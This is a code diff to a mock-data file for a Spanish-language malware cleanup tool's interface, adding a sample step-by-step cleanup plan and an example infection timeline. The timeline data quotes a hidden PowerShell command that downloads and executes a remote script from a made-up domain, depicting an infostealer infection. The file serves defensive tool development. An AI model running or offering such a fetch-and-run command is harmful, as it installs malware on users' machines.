@@ -1,7 +1,7 @@
 // Datos de EJEMPLO para desarrollar la interfaz en un navegador (fuera de la app no hay motor).
 // Dentro de la app nunca se usan.
 
-import type { ActionRecord, Config, DiffReport, EntityDetail, EntityScore, InventoryRow, Summary } from "./types";
+import type { ActionRecord, CleanupPlan, Config, DiffReport, EntityDetail, EntityScore, InventoryRow, Summary, Timeline } from "./types";
 
 const findings: EntityScore[] = [
   {
@@ -96,7 +96,42 @@ const detail: EntityDetail = {
   binary: { path: findings[0].path!, sha256: "9f2c41e07ab3…d81a0c55e2", size: 482304, reputation: [{ source: "ThreatFox", verdict: "malicious", family: "RedLine Stealer" }], signature: { isSigned: false, isValid: false, isCatalogSigned: false } },
 };
 
-const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
+const ago = (h: number) => new Date(Date.now() - h * 3600_000).toISOString();
+
+const plan: CleanupPlan = {
+  scanId: 12, status: "cleanup",
+  intro: "Seguí los pasos en orden. Cada acción se puede deshacer desde Actividad.",
+  phases: [
+    { id: "offline", title: "Desconectá la PC de internet", why: "Así lo que haya en la PC no puede seguir mandando datos mientras limpiás.", steps: [
+      { id: "offline", kind: "manual", title: "Desconectá el cable de red o apagá el Wi-Fi", body: "Tocá el ícono de red abajo a la derecha y apagá el Wi-Fi.", done: false, items: [] },
+    ] },
+    { id: "stop", title: "Cerrá lo que está corriendo", why: "Un proceso abierto puede volver a crear lo que borres.", steps: [
+      { id: "kill_process:a", kind: "action", action: "kill_process", entityKey: findings[0].scoringKey, entityName: "svchost.exe", title: "Finalizar el programa: svchost.exe", body: "No tiene firma y está en AppData.", done: false, items: [] },
+    ] },
+    { id: "startup", title: "Evitá que vuelva a arrancar solo", why: "Si no, aparece de nuevo al prender la PC.", steps: [
+      { id: "disable_startup:a", kind: "action", action: "disable_startup", entityKey: findings[0].scoringKey, entityName: "svchost.exe", title: "Deshabilitar el arranque automático: svchost.exe", body: "Arranca solo desde el registro de Windows.", done: true, items: [] },
+    ] },
+    { id: "passwords", title: "Cambiá tus contraseñas desde otro dispositivo", why: "Hay señales de un ladrón de contraseñas.", steps: [
+      { id: "passwords", kind: "passwords", title: "Cambiá las contraseñas desde el celular u otra PC", body: "Empezá por el mail.", done: false, items: ["Tu mail principal (Gmail, Outlook…)", "Banco y billeteras virtuales", "Todas las contraseñas guardadas en Chrome", "Discord"] },
+    ] },
+    { id: "verify", title: "Verificá que quedó limpio", why: "Un escaneo nuevo confirma que no volvió.", steps: [
+      { id: "rescan", kind: "scan", title: "Volvé a escanear", body: "Reiniciá la PC y escaneá de nuevo.", done: false, items: [] },
+    ] },
+  ],
+};
+
+const timeline: Timeline = {
+  note: "Ordenamos por fecha lo que Windows registró. Que dos cosas pasen cerca no prueba que una causó la otra; cuando sabemos que se trata del mismo archivo, lo marcamos.",
+  episodes: [{ start: ago(27), end: ago(26.6), title: "Lunes 12 de octubre, de 22:40 a 23:04", events: [
+    { time: ago(27), kind: "command", title: "Se pegó un comando en Ejecutar (Win+R)", detail: "powershell -w h -c \"iwr https://cdn-verify.top/c.ps1 | iex\"", level: "danger", entityKey: "cmd" },
+    { time: ago(26.95), kind: "download", title: "Se descargó svchost.exe", detail: "Desde cdn-verify.top", level: "danger", entityKey: findings[0].scoringKey, thread: "p", threadLabel: "svchost.exe" },
+    { time: ago(26.9), kind: "run", title: "Se ejecutó svchost.exe", detail: "Desde AppData.", level: "danger", entityKey: findings[0].scoringKey, thread: "p", threadLabel: "svchost.exe" },
+    { time: ago(26.6), kind: "change", title: "Se modificó el archivo de arranque de Discord", detail: "Le agregaron código que no es de la aplicación.", level: "danger", entityKey: "app" },
+  ] }],
+  undated: [{ kind: "startup", title: "svchost.exe quedó configurado para arrancar solo", detail: "Registro (Run)", level: "danger", entityKey: findings[0].scoringKey, thread: "p", threadLabel: "svchost.exe" }],
+};
+
+const sleep =(ms: number) => new Promise((r) => setTimeout(r, ms));
 
 export async function mockCall(op: string, args: Record<string, unknown> | undefined, emit: (e: string, d: unknown) => void): Promise<unknown> {
   await sleep(120);
@@ -106,6 +141,8 @@ export async function mockCall(op: string, args: Record<string, unknown> | undef
     case "findings.list": return findings;
     case "inventory": return inventory[String(args?.tab)] ?? [];
     case "diff": return diff;
+    case "plan": return plan;
+    case "timeline": return timeline;
     case "action.list": return actions;
     case "allowlist.list": return [];
     case "config.get": return config;
